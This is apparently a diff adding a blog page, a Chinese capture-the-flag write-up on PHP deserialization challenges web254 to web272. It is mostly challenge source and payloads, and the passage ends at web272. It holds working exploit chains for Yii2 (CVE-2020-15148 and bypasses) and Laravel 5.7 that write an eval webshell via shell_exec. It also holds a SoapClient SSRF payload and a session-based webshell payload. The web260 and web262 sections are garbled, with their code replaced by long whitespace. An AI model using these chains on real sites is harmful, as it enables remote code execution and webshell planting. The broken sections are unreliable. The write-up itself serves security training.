@@ -1,0 +1,1501 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>[ctfshow]PHP反序列化 | fallingskies</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://fallingskies22.github.io/favicon.ico?v=1724150366542">
+<link rel="stylesheet" href="https://fallingskies22.github.io/styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="web254
+&lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-12-02 17:44:47
+# @Last Modified by:   h1xa
+#..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://fallingskies22.github.io">
+        <img src="https://fallingskies22.github.io/images/avatar.png?v=1724150366542" class="site-logo">
+        <h1 class="site-title">fallingskies</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/post/friends" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      <h3>想要去月球<h3>
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://fallingskies22.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">[ctfshow]PHP反序列化</h2>
+            <div class="post-date">2024-03-27</div>
+            
+              <div class="feature-container" style="background-image: url('https://fallingskies22.github.io/post-images/ctfshowphp-fan-xu-lie-hua.png')">
+              </div>
+            
+            <div class="post-content" v-pre>
+              <h2 id="web254">web254</h2>
+<pre><code class="language-php">&lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-12-02 17:44:47
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-12-02 19:29:02
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+error_reporting(0);
+highlight_file(__FILE__);
+include('flag.php');
+
+class ctfShowUser{
+    public $username='xxxxxx';
+    public $password='xxxxxx';
+    public $isVip=false;
+
+    public function checkVip(){
+        return $this-&gt;isVip;
+    }
+    public function login($u,$p){
+        if($this-&gt;username===$u&amp;&amp;$this-&gt;password===$p){
+            $this-&gt;isVip=true;
+        }
+        return $this-&gt;isVip;
+    }
+    public function vipOneKeyGetFlag(){
+        if($this-&gt;isVip){
+            global $flag;
+            echo &quot;your flag is &quot;.$flag;
+        }else{
+            echo &quot;no vip, no flag&quot;;
+        }
+    }
+}
+
+$username=$_GET['username'];
+$password=$_GET['password'];
+
+if(isset($username) &amp;&amp; isset($password)){
+    $user = new ctfShowUser();
+    if($user-&gt;login($username,$password)){
+        if($user-&gt;checkVip()){
+            $user-&gt;vipOneKeyGetFlag();
+        }
+    }else{
+        echo &quot;no vip,no flag&quot;;
+    }
+}
+
+</code></pre>
+<p>传入username和password就行</p>
+<pre><code>?username=xxxxxx&amp;password=xxxxxx
+</code></pre>
+<h2 id="web255">web255</h2>
+<pre><code class="language-php">&lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-12-02 17:44:47
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-12-02 19:29:02
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+error_reporting(0);
+highlight_file(__FILE__);
+include('flag.php');
+
+class ctfShowUser{
+    public $username='xxxxxx';
+    public $password='xxxxxx';
+    public $isVip=false;
+
+    public function checkVip(){
+        return $this-&gt;isVip;
+    }
+    public function login($u,$p){
+        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;
+    }
+    public function vipOneKeyGetFlag(){
+        if($this-&gt;isVip){
+            global $flag;
+            echo &quot;your flag is &quot;.$flag;
+        }else{
+            echo &quot;no vip, no flag&quot;;
+        }
+    }
+}
+
+$username=$_GET['username'];
+$password=$_GET['password'];
+
+if(isset($username) &amp;&amp; isset($password)){
+    $user = unserialize($_COOKIE['user']);    
+    if($user-&gt;login($username,$password)){
+        if($user-&gt;checkVip()){
+            $user-&gt;vipOneKeyGetFlag();
+        }
+    }else{
+        echo &quot;no vip,no flag&quot;;
+    }
+}
+
+</code></pre>
+<p>生成序列化字符串</p>
+<pre><code class="language-php">&lt;?php
+
+class ctfShowUser{
+    public $username='xxxxxx';
+    public $password='xxxxxx';
+    public $isVip=true;
+}
+
+$user = new ctfShowUser();
+echo(serialize($user));
+</code></pre>
+<p>payload</p>
+<pre><code>?username=xxxxxx&amp;password=xxxxxx
+Cookie: user=O:11:&quot;ctfShowUser&quot;:3:{s:8:&quot;username&quot;%3bs:6:&quot;xxxxxx&quot;%3bs:8:&quot;password&quot;%3bs:6:&quot;xxxxxx&quot;%3bs:5:&quot;isVip&quot;%3bb:1%3b}
+</code></pre>
+<p>这里把Cookie里的<code>;</code>进行了url编码，不然识别不正确。</p>
+<h2 id="web256">web256</h2>
+<pre><code class="language-php">&lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-12-02 17:44:47
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-12-02 19:29:02
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+error_reporting(0);
+highlight_file(__FILE__);
+include('flag.php');
+
+class ctfShowUser{
+    public $username='xxxxxx';
+    public $password='xxxxxx';
+    public $isVip=false;
+
+    public function checkVip(){
+        return $this-&gt;isVip;
+    }
+    public function login($u,$p){
+        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;
+    }
+    public function vipOneKeyGetFlag(){
+        if($this-&gt;isVip){
+            global $flag;
+            if($this-&gt;username!==$this-&gt;password){
+                    echo &quot;your flag is &quot;.$flag;
+              }
+        }else{
+            echo &quot;no vip, no flag&quot;;
+        }
+    }
+}
+
+$username=$_GET['username'];
+$password=$_GET['password'];
+
+if(isset($username) &amp;&amp; isset($password)){
+    $user = unserialize($_COOKIE['user']);    
+    if($user-&gt;login($username,$password)){
+        if($user-&gt;checkVip()){
+            $user-&gt;vipOneKeyGetFlag();
+        }
+    }else{
+        echo &quot;no vip,no flag&quot;;
+    }
+}
+
+</code></pre>
+<pre><code class="language-php">&lt;?php
+
+class ctfShowUser{
+    public $username='1';
+    public $password='2';
+    public $isVip=true;
+}
+
+$user = new ctfShowUser();
+echo(serialize($user));
+</code></pre>
+<p>payload</p>
+<pre><code>?username=1&amp;password=2
+Cookie: user=O:11:&quot;ctfShowUser&quot;:3:{s:8:&quot;username&quot;%3bs:1:&quot;1&quot;%3bs:8:&quot;password&quot;%3bs:1:&quot;2&quot;%3bs:5:&quot;isVip&quot;%3bb:1%3b}
+</code></pre>
+<h2 id="web257">web257</h2>
+<pre><code class="language-php">&lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-12-02 17:44:47
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-12-02 20:33:07
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+error_reporting(0);
+highlight_file(__FILE__);
+
+class ctfShowUser{
+    private $username='xxxxxx';
+    private $password='xxxxxx';
+    private $isVip=false;
+    private $class = 'info';
+
+    public function __construct(){
+        $this-&gt;class=new info();
+    }
+    public function login($u,$p){
+        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;
+    }
+    public function __destruct(){
+        $this-&gt;class-&gt;getInfo();
+    }
+
+}
+
+class info{
+    private $user='xxxxxx';
+    public function getInfo(){
+        return $this-&gt;user;
+    }
+}
+
+class backDoor{
+    private $code;
+    public function getInfo(){
+        eval($this-&gt;code);
+    }
+}
+
+$username=$_GET['username'];
+$password=$_GET['password'];
+
+if(isset($username) &amp;&amp; isset($password)){
+    $user = unserialize($_COOKIE['user']);
+    $user-&gt;login($username,$password);
+}
+</code></pre>
+<p>private变量反序列化后字符前面会有<code>/x00</code>，使用<code>%00</code>进行编码。</p>
+<pre><code class="language-php">&lt;?php
+
+class ctfShowUser{
+    private $username='xxxxxx';
+    private $password='xxxxxx';
+    private $isVip=false;
+    private $class = &quot;info&quot;;
+
+    public function __construct(){
+        $this-&gt;class=new backDoor();
+    }
+}
+
+class backDoor{
+    private $code = &quot;system(\&quot;cat flag.php\&quot;);&quot;;
+    public function getInfo(){
+        eval($this-&gt;code);
+    }
+}
+
+$user = new ctfShowUser();
+$str = str_replace(&quot;\x00&quot;,&quot;%00&quot;,serialize($user));
+$str = str_replace(&quot;;&quot;,&quot;%3b&quot;,$str);
+
+echo $str;
+
+</code></pre>
+<p>payload</p>
+<pre><code>?username=xxxxxx&amp;password=xxxxxx
+Cookie: user=O:11:&quot;ctfShowUser&quot;:4:{s:21:&quot;%00ctfShowUser%00username&quot;%3bs:6:&quot;xxxxxx&quot;%3bs:21:&quot;%00ctfShowUser%00password&quot;%3bs:6:&quot;xxxxxx&quot;%3bs:18:&quot;%00ctfShowUser%00isVip&quot;%3bb:0%3bs:18:&quot;%00ctfShowUser%00class&quot;%3bO:8:&quot;backDoor&quot;:1:{s:14:&quot;%00backDoor%00code&quot;%3bs:23:&quot;system(&quot;cat flag.php&quot;)%3b&quot;%3b}}
+</code></pre>
+<h2 id="web258">web258</h2>
+<pre><code class="language-php">&lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-12-02 17:44:47
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-12-02 21:38:56
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+error_reporting(0);
+highlight_file(__FILE__);
+
+class ctfShowUser{
+    public $username='xxxxxx';
+    public $password='xxxxxx';
+    public $isVip=false;
+    public $class = 'info';
+
+    public function __construct(){
+        $this-&gt;class=new info();
+    }
+    public function login($u,$p){
+        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;
+    }
+    public function __destruct(){
+        $this-&gt;class-&gt;getInfo();
+    }
+
+}
+
+class info{
+    public $user='xxxxxx';
+    public function getInfo(){
+        return $this-&gt;user;
+    }
+}
+
+class backDoor{
+    public $code;
+    public function getInfo(){
+        eval($this-&gt;code);
+    }
+}
+
+$username=$_GET['username'];
+$password=$_GET['password'];
+
+if(isset($username) &amp;&amp; isset($password)){
+    if(!preg_match('/[oc]:\d+:/i', $_COOKIE['user'])){
+        $user = unserialize($_COOKIE['user']);
+    }
+    $user-&gt;login($username,$password);
+}
+</code></pre>
+<p>正则过滤了<code>O:11</code>，反序列化字符串的开头。<br>
+使用<code>O:+11</code>格式绕过</p>
+<p>直接全部urlencode。</p>
+<pre><code class="language-php">&lt;?php
+class ctfShowUser{
+    public $username='xxxxxx';
+    public $password='xxxxxx';
+    public $isVip=true;
+    public $class = 'backDoor';
+
+    public function __construct(){
+        $this-&gt;class=new backDoor();
+    }
+
+    public function __destruct(){
+        $this-&gt;class-&gt;getInfo();
+    }
+
+}
+
+class backDoor{
+    public $code=&quot;system('cat flag.php');&quot;;
+    public function getInfo(){
+        eval($this-&gt;code);
+    }
+}
+$a = new ctfShowUser();
+$a = serialize($a);
+$a= str_replace('O:', 'O:+',$a);
+echo urlencode($a);
+</code></pre>
+<p>payload</p>
+<pre><code>?username=xxxxxx&amp;password=xxxxxx
+Cookie: user=O%3A%2B11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A23%3A%22system%28%27cat+flag.php%27%29%3B%22%3B%7D%7D
+</code></pre>
+<h2 id="web259">web259</h2>
+<pre><code class="language-php">&lt;?php
+
+highlight_file(__FILE__);
+
+
+$vip = unserialize($_GET['vip']);
+//vip can get flag one key
+$vip-&gt;getFlag();
+</code></pre>
+<p>flag.php</p>
+<pre><code class="language-php">$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
+array_pop($xff);
+$ip = array_pop($xff);
+
+
+if($ip!=='127.0.0.1'){
+	die('error');
+}else{
+	$token = $_POST['token'];
+	if($token=='ctfshow'){
+		file_put_contents('flag.txt',$flag);
+	}
+}
+</code></pre>
+<p>这里考php的原生类<a href="https://www.php.net/manual/en/class.soapclient.php">SoapClient</a><br>
+这个类中有个__call魔术方法（当调用不存在的方法时触发），会调用SoapClient类的构造方法。</p>
+<pre><code class="language-php">&lt;?php
+$post_string = 'token=ctfshow';
+$b = new SoapClient(null,
+    array('location' =&gt; 'http://127.0.0.1/flag.php', 'user_agent' =&gt; 'ctfshow\r\nX-Forwarded-For:127.0.0.1,127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: ' . (string)strlen($post_string) . '\r\n\r\n' . $post_string, 'uri' =&gt; &quot;ssrf&quot;));
+$a = serialize($b);
+echo urlencode($a);
+?&gt;
+</code></pre>
+<p>提示没有SoapClient的话，记得在php.ini中的extension中开启。</p>
+<h2 id="web260">web260</h2>
+<pre><code>&lt;?php
+
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 ?&gt;');
+echo urlencode(serialize($a));
+</code></pre>
+<h2 id="web262">web262</h2>
+<pre><code class="language-php">&lt;?php
+
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  ?&gt;');
+$a-&gt;setStatus(1);
+
+echo(base64_encode(&quot;|&quot;.serialize($a)));
+</code></pre>
+<p>当在属性值中加入<code>|</code>，前面部分会被看作键名，后面部分会进行反序列化。</p>
+<p>payload</p>
+<pre><code>Cookie: PHPSESSID=31fmsqs4jquku9j65eepufq082; limit=fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiIxLnBocCI7czo4OiJwYXNzd29yZCI7czoyMzoiPD9waHAgZXZhbCgkX0dFVFsxXSk7Pz4iO3M6Njoic3RhdHVzIjtpOjE7fQ==
+//先访问index.php对session赋值，再访问check.php触发反序列化，生成log-1.php
+</code></pre>
+<h2 id="web264">web264</h2>
+<p>index.php</p>
+<pre><code class="language-php">&lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-12-03 02:37:19
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-12-03 16:05:38
+# @message.php
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+error_reporting(0);
+session_start();
+
+class message{
+    public $from;
+    public $msg;
+    public $to;
+    public $token='user';
+    public function __construct($f,$m,$t){
+        $this-&gt;from = $f;
+        $this-&gt;msg = $m;
+        $this-&gt;to = $t;
+    }
+}
+
+$f = $_GET['f'];
+$m = $_GET['m'];
+$t = $_GET['t'];
+
+if(isset($f) &amp;&amp; isset($m) &amp;&amp; isset($t)){
+    $msg = new message($f,$m,$t);
+    $umsg = str_replace('fuck', 'loveU', serialize($msg));
+    $_SESSION['msg']=base64_encode($umsg);
+    echo 'Your message has been sent';
+}
+
+highlight_file(__FILE__);
+</code></pre>
+<p>message.php</p>
+<pre><code class="language-php">&lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-12-03 15:13:03
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-12-03 15:17:17
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+session_start();
+highlight_file(__FILE__);
+include('flag.php');
+
+class message{
+    public $from;
+    public $msg;
+    public $to;
+    public $token='user';
+    public function __construct($f,$m,$t){
+        $this-&gt;from = $f;
+        $this-&gt;msg = $m;
+        $this-&gt;to = $t;
+    }
+}
+
+if(isset($_COOKIE['msg'])){
+    $msg = unserialize(base64_decode($_SESSION['msg']));
+    if($msg-&gt;token=='admin'){
+        echo $flag;
+    }
+}
+</code></pre>
+<p>使用web262的payload即可。<br>
+访问message.php时Cookie加上一个<code>;msg=1</code>。</p>
+<h2 id="web265">web265</h2>
+<pre><code class="language-php">&lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-12-04 23:52:24
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-12-05 00:17:08
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+error_reporting(0);
+include('flag.php');
+highlight_file(__FILE__);
+class ctfshowAdmin{
+    public $token;
+    public $password;
+
+    public function __construct($t,$p){
+        $this-&gt;token=$t;
+        $this-&gt;password = $p;
+    }
+    public function login(){
+        return $this-&gt;token===$this-&gt;password;
+    }
+}
+
+$ctfshow = unserialize($_GET['ctfshow']);
+$ctfshow-&gt;token=md5(mt_rand());
+
+if($ctfshow-&gt;login()){
+    echo $flag;
+}
+</code></pre>
+<p>考察php的按地址传参</p>
+<pre><code class="language-php">&lt;?php
+
+class ctfshowAdmin{
+    public $token;
+    public $password;
+
+    public function __construct($t,$p){
+        $this-&gt;token=$t;
+        $this-&gt;password = $p;
+    }
+    public function login(){
+        return $this-&gt;token===$this-&gt;password;
+    }
+}
+
+$a = new ctfshowAdmin(&quot;aaa&quot;,&quot;bbb&quot;);
+$a-&gt;password = &amp;$a-&gt;token;
+echo urlencode(serialize($a));
+
+</code></pre>
+<p>当token值变化时，password值也会变化。</p>
+<h2 id="web266">web266</h2>
+<pre><code class="language-php">&lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-12-04 23:52:24
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-12-05 00:17:08
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+highlight_file(__FILE__);
+
+include('flag.php');
+$cs = file_get_contents('php://input');
+
+
+class ctfshow{
+    public $username='xxxxxx';
+    public $password='xxxxxx';
+    public function __construct($u,$p){
+        $this-&gt;username=$u;
+        $this-&gt;password=$p;
+    }
+    public function login(){
+        return $this-&gt;username===$this-&gt;password;
+    }
+    public function __toString(){
+        return $this-&gt;username;
+    }
+    public function __destruct(){
+        global $flag;
+        echo $flag;
+    }
+}
+$ctfshowo=@unserialize($cs);
+if(preg_match('/ctfshow/', $cs)){
+    throw new Exception(&quot;Error $ctfshowo&quot;,1);
+}
+</code></pre>
+<p>反序列化时不区分类名大小写，可用大小写绕过。</p>
+<pre><code class="language-php">&lt;?php
+
+class ctfshow{
+    public $username='xxxxxx';
+    public $password='xxxxxx';
+    public function __construct($u,$p){
+        $this-&gt;username=$u;
+        $this-&gt;password=$p;
+    }
+    public function login(){
+        return $this-&gt;username===$this-&gt;password;
+    }
+    public function __toString(){
+        return $this-&gt;username;
+    }
+    public function __destruct(){
+        global $flag;
+        echo $flag;
+    }
+}
+
+$a = new ctfshow('','');
+
+echo serialize($a);
+</code></pre>
+<p>payload</p>
+<pre><code>O:7:&quot;cTfshow&quot;:2:{s:8:&quot;username&quot;;s:0:&quot;&quot;;s:8:&quot;password&quot;;s:0:&quot;&quot;;}
+</code></pre>
+<h2 id="web267">web267</h2>
+<p>由默认界面格式可以识别出是Yii2框架<br>
+<img src="https://fallingskies22.github.io/post-images/1711612618928.png" alt="" loading="lazy"><br>
+先使用弱口令<code>admin/admin</code>登录<br>
+查看<code>about</code>页面，有注释提示访问<code>?view-source</code><br>
+访问<code>index.php?r=site/about&amp;view-source</code></p>
+<pre><code class="language-php">///backdoor/shell
+unserialize(base64_decode($_GET['code']))
+</code></pre>
+<p>发现网站存在后门，这里提供了反序列化入口点。<br>
+Yii2存在反序列化漏洞<code>version&lt;2.0.38</code>(CVE-2020-15148)<br>
+该漏洞在2.0.38中修复，但存在许多绕过链，<a href="https://blog.csdn.net/cosmoslin/article/details/120612714">参考文章</a></p>
+<p>这里YII2版本为2.0.37,直接使用原始链。<br>
+查看版本路径：<code>/var/www/html/basic/vendor/yiisoft/yii2/BaseYii.php</code></p>
+<p>使用反序列化漏洞写shell</p>
+<pre><code class="language-php">&lt;?php
+namespace yii\rest{
+    class CreateAction{
+        public $checkAccess;
+        public $id;
+
+        public function __construct(){
+            $this-&gt;checkAccess = 'shell_exec';
+            $this-&gt;id = 'echo PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+ |base64 -d | tee 1.php';
+        }
+    }
+}
+
+namespace Faker{
+    use yii\rest\CreateAction;
+
+    class Generator{
+        protected $formatters;
+
+        public function __construct(){
+            $this-&gt;formatters['close'] = [new CreateAction(), 'run'];
+        }
+    }
+}
+
+namespace yii\db{
+    use Faker\Generator;
+
+    class BatchQueryResult{
+        private $_dataReader;
+
+        public function __construct(){
+            $this-&gt;_dataReader = new Generator;
+        }
+    }
+}
+namespace{
+    echo base64_encode(serialize(new yii\db\BatchQueryResult));
+}
+?&gt;
+</code></pre>
+<p>payload</p>
+<pre><code>?r=backdoor/shell&amp;code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6MTA6InNoZWxsX2V4ZWMiO3M6MjoiaWQiO3M6NjA6ImVjaG8gUEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiTVYwcE96OCsgfGJhc2U2NCAtZCB8IHRlZSAxLnBocCI7fWk6MTtzOjM6InJ1biI7fX19fQ==
+</code></pre>
+<h2 id="web268">web268</h2>
+<p>上一题过滤了system<br>
+这题过滤了system和close,<br>
+上题的链无法使用，换另一条链。</p>
+<pre><code class="language-php">class BackdoorController extends Controller{
+
+        public function actionShell($code){
+                if(!preg_match('/system|close/', base64_decode($code))){
+                    return unserialize(base64_decode($code));
+                }
+                return '';
+        }
+
+}
+</code></pre>
+<pre><code class="language-php">&lt;?php
+namespace yii\rest{
+    class CreateAction{
+        public $checkAccess;
+        public $id;
+
+        public function __construct(){
+            $this-&gt;checkAccess = 'shell_exec';
+            $this-&gt;id = 'echo PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+ |base64 -d | tee 1.php';
+        }
+    }
+}
+
+namespace Faker{
+    use yii\rest\CreateAction;
+
+    class Generator{
+        protected $formatters;
+
+        public function __construct(){
+            // 这里需要改为isRunning
+            $this-&gt;formatters['isRunning'] = [new CreateAction(), 'run'];
+        }
+    }
+}
+
+// poc2
+namespace Codeception\Extension{
+    use Faker\Generator;
+    class RunProcess{
+        private $processes;
+        public function __construct()
+        {
+            $this-&gt;processes = [new Generator()];
+        }
+    }
+}
+namespace{
+    // 生成poc
+    echo base64_encode(serialize(new Codeception\Extension\RunProcess()));
+}
+?&gt;
+</code></pre>
+<h2 id="web269">web269</h2>
+<p>又添加了过滤<br>
+<code>/var/www/html/basic/controllers/BackdoorController.php</code></p>
+<pre><code class="language-php">class BackdoorController extends Controller{
+
+        public function actionShell($code){
+                if(!preg_match('/system|close|Running/', base64_decode($code))){
+                    return unserialize(base64_decode($code));
+                }
+                return '';
+        }
+
+}
+</code></pre>
+<p>参考<a href="https://github.com/Maskhe/CVE-2020-15148-bypasses">Yii2反序列化链绕过</a></p>
+<pre><code class="language-php">&lt;?php
+namespace yii\rest{
+    class CreateAction{
+        public $checkAccess;
+        public $id;
+
+        public function __construct(){
+            $this-&gt;checkAccess = 'shell_exec';
+            $this-&gt;id = 'echo PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+ |base64 -d | tee 1.php';
+        }
+    }
+}
+
+namespace Faker{
+    use yii\rest\CreateAction;
+
+    class Generator{
+        protected $formatters;
+
+        public function __construct(){
+            // 这里需要改为isRunning
+            $this-&gt;formatters['render'] = [new CreateAction(), 'run'];
+        }
+    }
+}
+
+namespace phpDocumentor\Reflection\DocBlock\Tags{
+
+    use Faker\Generator;
+
+    class See{
+        protected $description;
+        public function __construct()
+        {
+            $this-&gt;description = new Generator();
+        }
+    }
+}
+namespace{
+    use phpDocumentor\Reflection\DocBlock\Tags\See;
+    class Swift_KeyCache_DiskKeyCache{
+        private $keys = [];
+        private $path;
+        public function __construct()
+        {
+            $this-&gt;path = new See;
+            $this-&gt;keys = array(
+                &quot;axin&quot;=&gt;array(&quot;is&quot;=&gt;&quot;handsome&quot;)
+            );
+        }
+    }
+    // 生成poc
+    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache()));
+}
+?&gt;
+</code></pre>
+<h2 id="web270">web270</h2>
+<p>又又是绕过</p>
+<pre><code class="language-php">class BackdoorController extends Controller{
+
+        public function actionShell($code){
+                if(!preg_match('/system|close|Running|render/', base64_decode($code))){
+                    return unserialize(base64_decode($code));
+                }
+                return '';
+        }
+
+}
+</code></pre>
+<pre><code class="language-php">&lt;?php
+
+namespace yii\rest{
+    class IndexAction{
+        public $checkAccess;
+        public $id;
+        public function __construct(){
+            $this-&gt;checkAccess = 'shell_exec';
+            $this-&gt;id = 'echo PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+ |base64 -d | tee 1.php';
+        }
+    }
+}
+namespace yii\db{
+
+    use yii\web\DbSession;
+
+    class BatchQueryResult
+    {
+        private $_dataReader;
+        public function __construct(){
+            $this-&gt;_dataReader=new DbSession();
+        }
+    }
+}
+namespace yii\web{
+
+    use yii\rest\IndexAction;
+
+    class DbSession
+    {
+        public $writeCallback;
+        public function __construct(){
+            $a=new IndexAction();
+            $this-&gt;writeCallback=[$a,'run'];
+        }
+    }
+}
+
+namespace{
+
+    use yii\db\BatchQueryResult;
+
+    echo base64_encode(serialize(new BatchQueryResult()));
+}
+</code></pre>
+<h2 id="web271">web271</h2>
+<p>开始考察Laravel框架的反序列化漏洞</p>
+<p>(CVE-2019-9081)<a href="https://laworigin.github.io/2019/02/21/laravelv5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/">Laravel v5.7.x 反序列化rce</a></p>
+<p>去<a href="https://cve.mitre.org/cve/search_cve_list.html">cve.mitre.org</a>搜这个漏洞，发现漏洞编号被撤销了，因为官方不认为这是一个安全问题😅</p>
+<pre><code class="language-php">&lt;?php
+namespace Illuminate\Foundation\Testing{
+    class PendingCommand{
+        protected $command;
+        protected $parameters;
+        protected $app;
+        public $test;
+        public function __construct($command, $parameters,$class,$app){
+            $this-&gt;command = $command;
+            $this-&gt;parameters = $parameters;
+            $this-&gt;test=$class;
+            $this-&gt;app=$app;
+        }
+    }
+}
+namespace Illuminate\Auth{
+    class GenericUser{
+        protected $attributes;
+        public function __construct(array $attributes){
+            $this-&gt;attributes = $attributes;
+        }
+    }
+}
+namespace Illuminate\Foundation{
+    class Application{
+        protected $hasBeenBootstrapped = false;
+        protected $bindings;
+        public function __construct($bind){
+            $this-&gt;bindings=$bind;
+        }
+    }
+}
+namespace{
+    $genericuser = new Illuminate\Auth\GenericUser(
+        array(
+            &quot;expectedOutput&quot;=&gt;array(&quot;0&quot;=&gt;&quot;1&quot;),
+            &quot;expectedQuestions&quot;=&gt;array(&quot;0&quot;=&gt;&quot;1&quot;)
+             )
+    );
+    $application = new Illuminate\Foundation\Application(
+        array(
+            &quot;Illuminate\Contracts\Console\Kernel&quot;=&gt;
+                array(
+                    &quot;concrete&quot;=&gt;&quot;Illuminate\Foundation\Application&quot;
+                     )
+             )
+    );
+    $pendingcommand = new Illuminate\Foundation\Testing\PendingCommand(
+        &quot;system&quot;,array('cat /flag'),
+        $genericuser,
+        $application
+    );
+    echo urlencode(serialize($pendingcommand));
+}
+?&gt;
+</code></pre>
+<h2 id="web272">web272</h2>
+<p>上题的链子被过滤了，而且上题的链只在5.7存在。<br>
